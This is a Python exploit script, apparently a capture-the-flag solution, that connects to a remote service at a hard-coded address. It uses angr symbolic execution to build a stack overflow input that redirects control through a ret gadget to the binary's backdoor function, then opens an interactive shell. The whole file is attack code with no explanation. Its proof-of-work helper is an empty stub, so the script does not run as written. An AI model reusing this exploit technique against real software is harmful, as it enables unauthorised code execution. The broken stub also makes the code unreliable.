from pwn import *
import angr
import claripy
import base64
def pass_proof(target, part):
    pass

r = remote("123.60.82.85", 1447)
r.recvline()
r.recvline()
r.recvline()
proof = r.recvline().decode("ASCII")
ppp = pass_proof(proof[proof.find("== ") + 3: -2], proof[len("sha256(xxxx + "): proof.find(") == ")])
r.sendlineafter(b"give me xxxx:", ppp.encode("ASCII"))
r.recvline()
bin_data = base64.b64decode(r.recvline().decode("ASCII"))
###########################################################################################################
open("a.out", "wb").write(bin_data)
ret_rop = bin_data.find(b'\xc3', 0x1000) + 0x400000
print("ret_rop:", hex(ret_rop))

p = angr.Project("./a.out")

def getBVV(state, sizeInBytes, type = 'str'):
    global pathConditions
    name = 's_' + str(state.globals['symbols_count'])
    bvs = claripy.BVS(name, sizeInBytes * 8)
    state.globals['symbols_count'] += 1
    state.globals[name] = (bvs, type)
    return bvs

def angr_load_str(state, addr):
    s, i = '', 0
    while True:
        ch = state.solver.eval(state.memory.load(addr + i, 1))
        if ch == 0: break
        s += chr(ch)
        i += 1
    return s

class ReplacementCheckEquals(angr.SimProcedure):
    def run(self, str1, str2):
        cmp1 = angr_load_str(self.state, str2).encode("ascii")
        cmp0 = self.state.memory.load(str1, len(cmp1))
        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))

class ReplacementCheckInput(angr.SimProcedure):
    def run(self, buf, len):
        len = self.state.solver.eval(len)
        self.state.memory.store(buf, getBVV(self.state, len))

class ReplacementInputVal(angr.SimProcedure):
    def run(self):
        self.state.regs.rax = getBVV(self.state, 4, 'int') 

class ReplacementInit(angr.SimProcedure):
    def run(self):
        return 

p.hook_symbol("_Z5fksthPKcS0_", ReplacementCheckEquals())
p.hook_symbol("_Z10input_linePcm", ReplacementCheckInput())
p.hook_symbol("_Z9input_valv", ReplacementInputVal())
p.hook_symbol("_Z4initv", ReplacementInit())
enter = p.factory.entry_state()
enter.globals['symbols_count'] = 0
simgr = p.factory.simgr(enter, save_unconstrained=True)
d = simgr.explore()
backdoor = p.loader.find_symbol('_Z8backdoorv').rebased_addr
for state in d.unconstrained:
    bindata = b''
    rsp = state.regs.rsp
    next_stack = state.memory.load(rsp, 8, endness=p.arch.memory_endness)
    state.add_constraints(state.regs.rip == ret_rop)
    state.add_constraints(next_stack == backdoor)
    for i in range(state.globals['symbols_count']):
        s, s_type = state.globals['s_' + str(i)]
        if s_type == 'str':
            bb = state.solver.eval(s, cast_to=bytes)
            if bb.count(b'\x00') == len(bb):
                bb = b'A' * bb.count(b'\x00')
            bindata += bb
        elif s_type == 'int':
            bindata += str(state.solver.eval(s, cast_to=int)).encode('ASCII') + b' '
    print(bindata)
    r.send(bindata)
    r.interactive()
    break